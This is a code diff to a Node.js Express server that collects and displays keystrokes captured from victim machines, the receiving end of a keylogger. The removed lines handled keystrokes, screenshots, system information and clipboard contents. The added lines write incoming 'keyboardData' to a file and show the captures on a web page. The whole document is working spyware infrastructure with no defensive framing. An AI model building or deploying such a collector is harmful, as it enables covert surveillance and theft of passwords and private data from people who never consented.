@@ -9,34 +9,27 @@ app.use(bodyParser.json({ extended: true }));
 
 const port = 8080;
 
-// Route to handle POST requests and save the received data
+// Route to handle GET requests and display logged keystrokes
+app.get("/", (req, res) => {
+    try {
+        // Read the keystrokes from the file
+        const kl_file = fs.readFileSync("./keystroke_captures.txt", { encoding: 'utf8', flag: 'r' });
+        
+        // Replace newline characters with <br> for HTML formatting
+        res.send(`<h1 style="color: #3366cc;">Captures</h1><p style="color: #009900;">${kl_file.replace("\n", "<br>")}</p>`);
+    } catch {
+        // If file doesn't exist or any error occurs, send a message indicating no data
+        res.send("<h1 style='color: #cc0000;'>Still Capturing......</h1>");
+    }
+});
+
+// Route to handle POST requests and save the keystrokes data
 app.post("/", (req, res) => {
-    const { keystrokes, screenshot, system_info, clipboard_content } = req.body;
-
-    if (keystrokes) {
-        console.log("Keystrokes:", keystrokes);
-        // Save or process keystrokes
-        fs.appendFileSync("keystroke_captures.txt", keystrokes.join('') + "\n");
-    }
+    console.log(req.body.keyboardData);
     
-    if (screenshot) {
-        console.log("Screenshot captured:", screenshot);
-        // Save or process screenshot
-        // For example, you can move it to a specific directory
-        fs.renameSync(screenshot, `screenshots/${Date.now()}_screenshot.jpg`);
-    }
-
-    if (system_info) {
-        console.log("System information:", system_info);
-        // Save or process system information
-    }
-
-    if (clipboard_content) {
-        console.log("Clipboard content:", clipboard_content);
-        // Save or process clipboard content
-    }
-
-    res.send("Data received successfully");
+    // Write the received keystrokes data to the file
+    fs.writeFileSync("keystroke_captures.txt", req.body.keyboardData);
+    res.send("Successfully set the data");
 });
 
 // Start the server and listen on the specified port
